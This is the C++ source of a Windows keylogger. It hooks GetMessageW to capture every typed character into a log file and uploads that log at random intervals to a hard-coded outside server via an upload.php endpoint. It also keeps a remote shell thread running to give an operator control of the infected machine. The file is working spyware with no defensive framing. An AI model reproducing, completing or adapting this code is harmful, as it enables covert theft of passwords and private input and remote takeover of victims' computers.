#include "Keylogger.h"
#include "HookUtils.h"
#include "LogFile.h"
#include "NetClient.h"

//
/*
BOOL WINAPI GetMessage(
  _Out_     LPMSG lpMsg,
  _In_opt_  HWND hWnd,
  _In_      UINT wMsgFilterMin,
  _In_      UINT wMsgFilterMax
);
*/
typedef BOOL (WINAPI *GetMessageFunc)(LPMSG, HWND, UINT, UINT);
GetMessageFunc OriginalGetMessage; // pointer to original getmessage

// indicate keylogger state (used in the loop)
bool IsKeyLoggerRunning = false;

LogFile log_file;
NetClient* client;

/*
	Hooked GetMessage Function, all of the target process WM_CHAR messages are intercepted here
*/
BOOL WINAPI GetMessage_Hooked(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)
{
	static char key[2]; // used to stored converted key

	// call orig first to get message data
	BOOL res = OriginalGetMessage(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);

	// now that we got the message, check if its a keypress
	if (res && lpMsg->message == WM_CHAR)
	{
		// we got a key press, convert to char and log it
		key[0] = (char)lpMsg->wParam;
		key[1] = 0;
		//MessageBox(0, key, "Key Pressed!", 0);
		log_file.AppendString((char*)key);
	}

	return res;
}

void InstallHook()
{
	// install hook
	LPVOID GetMessageAddr = GetProcAddress(GetModuleHandle("user32.dll"), "GetMessageW");
	if (GetMessageAddr == NULL)
		return;
	OriginalGetMessage = (GetMessageFunc)DetourCode((BYTE*)GetMessageAddr, (BYTE*)GetMessage_Hooked, 5);
}

// remote shell runs in a separate thread (since recv() call blocks current thread)
DWORD RemoteShellThread(LPVOID args)
{
	if (!args) return 0;
	NetClient* client_ptr = (NetClient*)args;

	client_ptr->StartRemoteShell("localhost", "1334");
	return 1;
}

void KeyLoggerLoop()
{
	DWORD old_time = 0;
	HANDLE hthread = NULL; // remote shell thread

	// init rand generator seed
	srand(GetTickCount());
	while (IsKeyLoggerRunning)
	{
		// upload log to server after specified timespan
		DWORD current_time = GetTickCount();
		DWORD rand_time_span = rand() % 10000 + 5000;//600000 + 300000; // 600000 = 10 mins in milliseconds, 300000 = 5 mins
		DWORD file_size = log_file.GetFileSize(); // file must be > 100 bytes before being sent over the net
		if ( (file_size >= 100) && 
			 (old_time == 0 || (current_time - old_time) >= rand_time_span))
		{
			// update oldtime for next iteration
			old_time = current_time;

			// post log file to server
			if (client->UploadLog(log_file.logFileName))
			{
				// flush log after it is sent to sever (to avoid duplicate information)
				log_file.FlushContents();
			}
		}

		// keep alive remote shell
		DWORD exitCode = 0;
		if (hthread != NULL) // we are not running for the first time
			GetExitCodeThread(hthread, &exitCode);
		if (exitCode != STILL_ACTIVE)
		{
			// (re-)initialize the remote shell
			hthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RemoteShellThread, client, 0, NULL);
		}
		Sleep(500);
	}
}

void StopKeyLogger()
{
	// do finalization code
	IsKeyLoggerRunning = true;
	delete &log_file;
	delete client;
}

void StartKeyLogger()
{
	// do initialization code
	InstallHook();
	IsKeyLoggerRunning = true;
	
	// initialize net client keylogger connection to keylogger server
	client = new NetClient(	"108.175.15.104", 
							"80", 
							"erickbarrera.com", 
							"/listen/upload.php", 
							"name", 
							"log");


	// loop (this loop is used to send network message with log)
	// as well as to keep alive the remote shell
	KeyLoggerLoop();
}
